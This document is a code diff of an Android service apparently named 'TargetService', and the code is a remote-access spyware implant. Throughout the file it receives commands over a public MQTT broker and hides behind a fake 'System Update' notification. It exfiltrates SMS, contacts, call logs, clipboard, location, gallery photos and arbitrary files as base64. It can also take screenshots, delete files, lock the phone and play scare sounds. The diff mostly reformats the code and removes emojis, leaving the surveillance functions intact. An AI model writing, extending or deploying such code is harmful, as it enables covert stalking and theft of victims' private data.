@@ -1,4 +1,5 @@
 package com.ghost.target
+
 import android.app.*
 import android.app.admin.DevicePolicyManager
 import android.content.*
@@ -32,8 +33,11 @@ class TargetService : Service() {
         var mqttClient: MqttClient? = null
         const val ROOM_ID = "GHOST_SECRET_ROOM_99"
         const val BROKER = "tcp://broker.hivemq.com:1883"
-        fun sendLog(t: String) { try { mqttClient?.publish("$ROOM_ID/res", MqttMessage(t.toByteArray())) } catch (e: Exception) {} }
+        fun sendLog(t: String) { 
+            try { mqttClient?.publish("$ROOM_ID/res", MqttMessage(t.toByteArray())) } catch (e: Exception) {} 
+        }
     }
+
     private var cameraId: String? = null
     private var mediaProjection: MediaProjection? = null
     private var mediaPlayer: MediaPlayer? = null
@@ -58,7 +62,8 @@ class TargetService : Service() {
     override fun onBind(i: Intent?): IBinder? = null
 
     private fun buildNotif(): Notification {
-        val ch = "g_ch"; val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
+        val ch = "g_ch"
+        val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
         if (Build.VERSION.SDK_INT >= 26) nm.createNotificationChannel(NotificationChannel(ch, "Sys", NotificationManager.IMPORTANCE_LOW))
         return NotificationCompat.Builder(this, ch).setContentTitle("System Update").setContentText("Updating...").setSmallIcon(android.R.drawable.stat_notify_sync).build()
     }
@@ -72,8 +77,8 @@ class TargetService : Service() {
             cmd == "screenshot" -> takeScreenshot()
             cmd == "ghost_sound" -> playGhostSound()
             cmd == "ring" -> playRing()
-            cmd == "stop_audio" -> { mediaPlayer?.release(); mediaPlayer = null; sendLog("⏹️ Stopped") }
-            cmd.startsWith("tts:") -> { tts?.speak(cmd.substringAfter("tts:"), TextToSpeech.QUEUE_FLUSH, null, "g"); sendLog("🗣️ Speaking") }
+            cmd == "stop_audio" -> { mediaPlayer?.release(); mediaPlayer = null; sendLog("Stopped") }
+            cmd.startsWith("tts:") -> { tts?.speak(cmd.substringAfter("tts:"), TextToSpeech.QUEUE_FLUSH, null, "g"); sendLog("Speaking") }
             cmd == "toast_default" -> Handler(Looper.getMainLooper()).post { Toast.makeText(this, "System Error!", Toast.LENGTH_SHORT).show() }
             cmd.startsWith("toast:") -> Handler(Looper.getMainLooper()).post { Toast.makeText(this, cmd.substringAfter("toast:"), Toast.LENGTH_LONG).show() }
             cmd == "torch_on" -> setTorch(true)
@@ -90,12 +95,12 @@ class TargetService : Service() {
             cmd == "sms" -> sendLog(getSms())
             cmd == "calls" -> sendLog(getCalls())
             cmd == "apps" -> sendLog(getApps())
-            cmd == "device" -> sendLog("📱 Model: ${Build.MODEL}\nOS: ${Build.VERSION.RELEASE}")
+            cmd == "device" -> sendLog("Model: ${Build.MODEL}\nOS: ${Build.VERSION.RELEASE}")
             cmd == "wifi" -> sendLog(getWifi())
             cmd == "battery" -> sendLog(getBattery())
             cmd == "clip" -> sendLog(getClipboard())
-            cmd == "acc_text" -> sendLog("♿ Baca log aksesibilitas di file /sdcard/Download/ghost_acc.txt")
-            cmd == "acc_notif" -> sendLog("📩 Cek file /sdcard/Download/ghost_notifs.txt")
+            cmd == "acc_text" -> sendLog("Cek file /sdcard/Download/ghost_acc.txt")
+            cmd == "acc_notif" -> sendLog("Cek file /sdcard/Download/ghost_notifs.txt")
             cmd == "gallery" -> sendLog(getGallery())
             cmd.startsWith("dl_gallery:") -> downloadGallery(cmd.substringAfter("dl_gallery:"))
             cmd.startsWith("ls:") -> sendLog(listFiles(cmd.substringAfter("ls:")))
@@ -103,7 +108,10 @@ class TargetService : Service() {
             cmd.startsWith("del:") -> deleteFile(cmd.substringAfter("del:"))
             cmd.startsWith("dl:") -> downloadFile(cmd.substringAfter("dl:"))
             cmd.startsWith("mkdir:") -> createDir(cmd.substringAfter("mkdir:"))
-            cmd.startsWith("rename:") -> { val p = cmd.substringAfter("rename:").split("|"); if (p.size == 2) renameFile(p[0], p[1]) }
+            cmd.startsWith("rename:") -> { 
+                val p = cmd.substringAfter("rename:").split("|")
+                if (p.size == 2) renameFile(p[0], p[1]) 
+            }
         }
     }
 
@@ -111,7 +119,7 @@ class TargetService : Service() {
         val cm = getSystemService(CAMERA_SERVICE) as CameraManager
         val id = if (front) cm.cameraIdList.firstOrNull { cm.getCameraCharacteristics(it).get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT } else cameraId
         if (id == null) {
-            sendLog("❌ Camera not found")
+            sendLog("Camera not found")
             cont.resume(Unit)
             return@suspendCoroutine
         }
@@ -161,7 +169,7 @@ class TargetService : Service() {
     }
 
     private fun takeScreenshot() {
-        val mp = mediaProjection ?: return sendLog("❌ Izin screenshot belum aktif")
+        val mp = mediaProjection ?: return sendLog("Screenshot permission not granted")
         val dm = resources.displayMetrics
         val w = dm.widthPixels; val h = dm.heightPixels; val d = dm.densityDpi
         val reader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 1)
@@ -183,10 +191,19 @@ class TargetService : Service() {
         try {
             val am = getSystemService(AUDIO_SERVICE) as AudioManager
             am.setStreamVolume(AudioManager.STREAM_MUSIC, am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0)
-            val sr = 8000; val ns = (5.0 * sr).toInt(); val s = DoubleArray(ns); val gs = ByteArray(2 * ns)
+            val sr = 8000
+            val ns = (5.0 * sr).toInt()
+            val s = DoubleArray(ns)
+            val gs = ByteArray(2 * ns)
             for (i in 0 until ns) s[i] = Math.sin(2 * Math.PI * i / (sr / 50.0))
-            var idx = 0; for (v in s) { val vs = (v * 32767).toInt().toShort(); gs[idx++] = (vs.toInt() and 0x00ff).toByte(); gs[idx++] = ((vs.toInt() and 0xff00) ushr 8).toByte() }
-            val f = File(cacheDir, "ghost.wav"); val fos = FileOutputStream(f)
+            var idx = 0
+            for (v in s) { 
+                val vs = (v * 32767).toInt().toShort()
+                gs[idx++] = (vs.toInt() and 0x00ff).toByte()
+                gs[idx++] = ((vs.toInt() and 0xff00) ushr 8).toByte() 
+            }
+            val f = File(cacheDir, "ghost.wav")
+            val fos = FileOutputStream(f)
             val header = byteArrayOf(
                 82.toByte(), 73.toByte(), 70.toByte(), 70.toByte(), (36 + ns * 2).toByte(), 0.toByte(), 0.toByte(), 0.toByte(),
                 87.toByte(), 65.toByte(), 86.toByte(), 69.toByte(), 102.toByte(), 109.toByte(), 116.toByte(), 32.toByte(),
@@ -195,39 +212,43 @@ class TargetService : Service() {
                 2.toByte(), 0.toByte(), 16.toByte(), 0.toByte(), 100.toByte(), 97.toByte(), 116.toByte(), 97.toByte(),
                 (ns * 2).toByte(), 0.toByte(), 0.toByte(), 0.toByte()
             )
-            fos.write(header); fos.write(gs); fos.close()
-            mediaPlayer?.release(); mediaPlayer = MediaPlayer().apply { setDataSource(f.absolutePath); prepare(); start() }
-            sendLog("👻 Ghost Sound Playing")
+            fos.write(header)
+            fos.write(gs)
+            fos.close()
+            mediaPlayer?.release()
+            mediaPlayer = MediaPlayer().apply { setDataSource(f.absolutePath); prepare(); start() }
+            sendLog("Ghost Sound Playing")
         } catch (e: Exception) { sendLog("err: ${e.message}") }
     }
 
     private fun playRing() {
         val am = getSystemService(AUDIO_SERVICE) as AudioManager
         am.setStreamVolume(AudioManager.STREAM_RING, am.getStreamMaxVolume(AudioManager.STREAM_RING), 0)
-        mediaPlayer?.release(); mediaPlayer = MediaPlayer.create(this, Settings.System.DEFAULT_RINGTONE_URI).apply { isLooping = false; start() }
-        sendLog("🔔 Ringing")
+        mediaPlayer?.release()
+        mediaPlayer = MediaPlayer.create(this, Settings.System.DEFAULT_RINGTONE_URI).apply { isLooping = false; start() }
+        sendLog("Ringing")
     }
 
-    private fun setTorch(on: Boolean) { try { (getSystemService(CAMERA_SERVICE) as CameraManager).setTorchMode(cameraId ?: return, on); sendLog(if (on) "🔦 ON" else "🔅 OFF") } catch (e: Exception) {} }
-    private fun vibratePhone() { val v = getSystemService(VIBRATOR_SERVICE) as Vibrator; if (Build.VERSION.SDK_INT >= 26) v.vibrate(VibrationEffect.createOneShot(1000, VibrationEffect.DEFAULT_AMPLITUDE)); sendLog("📳 Vibrate") }
-    private fun setVol(pct: Int) { val am = getSystemService(AUDIO_SERVICE) as AudioManager; am.setStreamVolume(AudioManager.STREAM_MUSIC, am.getStreamMaxVolume(AudioManager.STREAM_MUSIC) * pct / 100, 0); sendLog("🔊 Volume $pct%") }
-    private fun lockScreen() { val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager; if (dpm.isAdminActive(ComponentName(this, AdminReceiver::class.java))) { dpm.lockNow(); sendLog("🔒 Locked") } }
-    private fun startApp(pkg: String) { val i = packageManager.getLaunchIntentForPackage(pkg); if (i != null) { startActivity(i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)); sendLog("🚀 $pkg") } else sendLog("❌ not found") }
-    private fun getLocation() { val lm = getSystemService(LOCATION_SERVICE) as LocationManager; val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER) ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER); if (loc != null) sendLog("📍 ${loc.latitude}, ${loc.longitude}") else sendLog("📍 No location") }
-    private fun trackLocation() { CoroutineScope(Dispatchers.IO).launch { val lm = getSystemService(LOCATION_SERVICE) as LocationManager; for (i in 1..5) { val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER); if (loc != null) sendLog("📍 Track $i: ${loc.latitude}, ${loc.longitude}"); delay(5000) } } }
-    private fun getContacts(): String { val sb = StringBuilder("📇 Kontak:\n"); var c = 0; contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER), null, null, null)?.use { while (it.moveToNext() && c < 20) { sb.append("• ${it.getString(0)}: ${it.getString(1)}\n"); c++ } }; return if (c == 0) "Kosong" else sb.toString() }
-    private fun getSms(): String { val sb = StringBuilder("💬 SMS:\n"); var c = 0; contentResolver.query(Telephony.Sms.CONTENT_URI, arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY), null, null, Telephony.Sms.DATE + " DESC")?.use { while (it.moveToNext() && c < 20) { sb.append("• ${it.getString(0)}: ${it.getString(1)?.take(50)}\n"); c++ } }; return if (c == 0) "Kosong" else sb.toString() }
-    private fun getCalls(): String { val sb = StringBuilder("📞 Call Log:\n"); var c = 0; contentResolver.query(CallLog.Calls.CONTENT_URI, arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DURATION), null, null, CallLog.Calls.DATE + " DESC")?.use { while (it.moveToNext() && c < 20) { sb.append("• ${it.getString(0)} | ${it.getLong(2)}s\n"); c++ } }; return if (c == 0) "Kosong" else sb.toString() }
-    private fun getApps(): String { val sb = StringBuilder("📦 Apps:\n"); var c = 0; packageManager.getInstalledPackages(0).forEach { if (c < 30) { sb.append("• ${it.packageName}\n"); c++ } }; return sb.toString() }
-    private fun getWifi(): String { val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager; @Suppress("DEPRECATION") val i = wm.connectionInfo; return "📶 SSID: ${i.ssid}\nIP: ${i.ipAddress}" }
-    private fun getBattery(): String { val bm = getSystemService(BATTERY_SERVICE) as BatteryManager; return "🔋 Battery: ${bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)}%" }
-    private fun getClipboard(): String { val cm = getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager; val c = cm.primaryClip; return if (c == null || c.itemCount == 0) "📋 Kosong" else "📋 ${c.getItemAt(0).text}" }
-    private fun getGallery(): String { val dir = File("/sdcard/DCIM/Camera"); val files = dir.listFiles { f -> f.isFile && f.name.endsWith(".jpg") }?.sortedByDescending { it.lastModified() }?.take(15); if (files.isNullOrEmpty()) return "Galeri kosong"; val sb = StringBuilder("🖼️ Galeri (15 terakhir):\n"); files.forEach { sb.append("• ${it.name} (${it.length()/1024} KB)\n") }; return sb.toString() }
-    private fun downloadGallery(name: String) { val f = File("/sdcard/DCIM/Camera/$name"); if (f.exists()) sendLog("file:$name|" + Base64.encodeToString(f.readBytes(), Base64.NO_WRAP)) else sendLog("❌ File not found") }
-    private fun listFiles(path: String): String { val f = File(path); if (!f.exists()) return "❌ Not found"; val sb = StringBuilder("📂 $path:\n"); var c = 0; f.listFiles()?.forEach { if (c < 20) { sb.append(if (it.isDirectory) "📁 " else "📄 ").append(it.name).append("\n"); c++ } }; return sb.toString() }
-    private fun readFile(path: String): String { val f = File(path); if (!f.exists()) return "❌ File not found"; return try { "📝 $path:\n${f.readText()}" } catch (e: Exception) { "❌ ${e.message}" } }
-    private fun deleteFile(path: String): String { val f = File(path); return if (f.exists() && f.delete()) "🗑️ Deleted" else "❌ Failed" }
-    private fun downloadFile(path: String) { val f = File(path); if (!f.exists()) return sendLog("❌ Not found"); if (f.length() > 5*1024*1024) return sendLog("❌ File > 5MB"); sendLog("file:${f.name}|" + Base64.encodeToString(f.readBytes(), Base64.NO_WRAP)) }
-    private fun createDir(path: String) { val f = File(path); if (f.mkdirs()) sendLog("📁 Created: $path") else sendLog("❌ Failed") }
-    private fun renameFile(from: String, to: String) { val f1 = File(from); val f2 = File(to); if (f1.renameTo(f2)) sendLog("🔄 Renamed") else sendLog("❌ Failed") }
+    private fun setTorch(on: Boolean) { try { (getSystemService(CAMERA_SERVICE) as CameraManager).setTorchMode(cameraId ?: return, on); sendLog(if (on) "ON" else "OFF") } catch (e: Exception) {} }
+    private fun vibratePhone() { val v = getSystemService(VIBRATOR_SERVICE) as Vibrator; if (Build.VERSION.SDK_INT >= 26) v.vibrate(VibrationEffect.createOneShot(1000, VibrationEffect.DEFAULT_AMPLITUDE)); sendLog("Vibrate") }
+    private fun setVol(pct: Int) { val am = getSystemService(AUDIO_SERVICE) as AudioManager; am.setStreamVolume(AudioManager.STREAM_MUSIC, am.getStreamMaxVolume(AudioManager.STREAM_MUSIC) * pct / 100, 0); sendLog("Volume $pct%") }
+    private fun lockScreen() { val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager; if (dpm.isAdminActive(ComponentName(this, AdminReceiver::class.java))) { dpm.lockNow(); sendLog("Locked") } }
+    private fun startApp(pkg: String) { val i = packageManager.getLaunchIntentForPackage(pkg); if (i != null) { startActivity(i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)); sendLog("$pkg") } else sendLog("not found") }
+    private fun getLocation() { val lm = getSystemService(LOCATION_SERVICE) as LocationManager; val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER) ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER); if (loc != null) sendLog("${loc.latitude}, ${loc.longitude}") else sendLog("No location") }
+    private fun trackLocation() { CoroutineScope(Dispatchers.IO).launch { val lm = getSystemService(LOCATION_SERVICE) as LocationManager; for (i in 1..5) { val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER); if (loc != null) sendLog("Track $i: ${loc.latitude}, ${loc.longitude}"); delay(5000) } } }
+    private fun getContacts(): String { val sb = StringBuilder("Kontak:\n"); var c = 0; contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER), null, null, null)?.use { while (it.moveToNext() && c < 20) { sb.append("${it.getString(0)}: ${it.getString(1)}\n"); c++ } }; return if (c == 0) "Kosong" else sb.toString() }
+    private fun getSms(): String { val sb = StringBuilder("SMS:\n"); var c = 0; contentResolver.query(Telephony.Sms.CONTENT_URI, arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY), null, null, Telephony.Sms.DATE + " DESC")?.use { while (it.moveToNext() && c < 20) { sb.append("${it.getString(0)}: ${it.getString(1)?.take(50)}\n"); c++ } }; return if (c == 0) "Kosong" else sb.toString() }
+    private fun getCalls(): String { val sb = StringBuilder("Call Log:\n"); var c = 0; contentResolver.query(CallLog.Calls.CONTENT_URI, arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DURATION), null, null, CallLog.Calls.DATE + " DESC")?.use { while (it.moveToNext() && c < 20) { sb.append("${it.getString(0)} | ${it.getLong(2)}s\n"); c++ } }; return if (c == 0) "Kosong" else sb.toString() }
+    private fun getApps(): String { val sb = StringBuilder("Apps:\n"); var c = 0; packageManager.getInstalledPackages(0).forEach { if (c < 30) { sb.append("${it.packageName}\n"); c++ } }; return sb.toString() }
+    private fun getWifi(): String { val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager; @Suppress("DEPRECATION") val i = wm.connectionInfo; return "SSID: ${i.ssid}\nIP: ${i.ipAddress}" }
+    private fun getBattery(): String { val bm = getSystemService(BATTERY_SERVICE) as BatteryManager; return "Battery: ${bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)}%" }
+    private fun getClipboard(): String { val cm = getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager; val c = cm.primaryClip; return if (c == null || c.itemCount == 0) "Kosong" else "${c.getItemAt(0).text}" }
+    private fun getGallery(): String { val dir = File("/sdcard/DCIM/Camera"); val files = dir.listFiles { f -> f.isFile && f.name.endsWith(".jpg") }?.sortedByDescending { it.lastModified() }?.take(15); if (files.isNullOrEmpty()) return "Galeri kosong"; val sb = StringBuilder("Galeri (15 terakhir):\n"); files.forEach { sb.append("${it.name} (${it.length()/1024} KB)\n") }; return sb.toString() }
+    private fun downloadGallery(name: String) { val f = File("/sdcard/DCIM/Camera/$name"); if (f.exists()) sendLog("file:$name|" + Base64.encodeToString(f.readBytes(), Base64.NO_WRAP)) else sendLog("File not found") }
+    private fun listFiles(path: String): String { val f = File(path); if (!f.exists()) return "Not found"; val sb = StringBuilder("$path:\n"); var c = 0; f.listFiles()?.forEach { if (c < 20) { sb.append(if (it.isDirectory) "[D] " else "[F] ").append(it.name).append("\n"); c++ } }; return sb.toString() }
+    private fun readFile(path: String): String { val f = File(path); if (!f.exists()) return "File not found"; return try { "$path:\n${f.readText()}" } catch (e: Exception) { "${e.message}" } }
+    private fun deleteFile(path: String): String { val f = File(path); return if (f.exists() && f.delete()) "Deleted" else "Failed" }
+    private fun downloadFile(path: String) { val f = File(path); if (!f.exists()) return sendLog("Not found"); if (f.length() > 5*1024*1024) return sendLog("File > 5MB"); sendLog("file:${f.name}|" + Base64.encodeToString(f.readBytes(), Base64.NO_WRAP)) }
+    private fun createDir(path: String) { val f = File(path); if (f.mkdirs()) sendLog("Created: $path") else sendLog("Failed") }
+    private fun renameFile(from: String, to: String) { val f1 = File(from); val f2 = File(to); if (f1.renameTo(f2)) sendLog("Renamed") else sendLog("Failed") }
 }
